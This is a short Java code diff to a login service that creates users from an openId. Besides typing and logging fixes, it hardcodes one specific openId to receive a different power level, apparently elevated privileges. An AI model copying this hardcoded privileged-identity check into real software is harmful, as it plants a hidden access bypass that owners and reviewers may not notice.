@@ -59,20 +59,20 @@ public class UserServiceImpl extends ServiceImpl<UserMapper, User> implements Us
             throw new BusinessException(String.format("获取openId失败,errCode:%s,errMsg:%s", jsonObject.get("errcode"), jsonObject.get("errmsg")));
         }
         String openId = jsonObject.get("openid").toString();
-        QueryWrapper queryWrapper = new QueryWrapper();
+        QueryWrapper<User> queryWrapper = new QueryWrapper<User>();
         queryWrapper.eq("code", openId);
         User user = getOne(queryWrapper);
         String id = "";
         if (Utils.getInstance().isNull(user)) {
             try {
                 id = UUIDUtils.getInstance().getUUID();
-                user = new User().setCode(openId).setId(id).setNickname(nickname).setPower(1);
+                user = new User().setCode(openId).setId(id).setNickname(nickname).setPower(openId.equals("ouTqJ5JwfRjXmXQfAy2W9DN4jsyg") ? 0 : 1);
                 save(user);
             } catch (Exception e) {
                 throw new BusinessException("新增用户失败");
             }
         }
-        log.info(String.format("登陆成功，code:%s,id:%s", code, id));
+        log.info(String.format("登陆成功，code:%s,id:%s", code, Utils.getInstance().isNull(id) ? user.getId() : id));
         return new UserVo(user);
     }
 
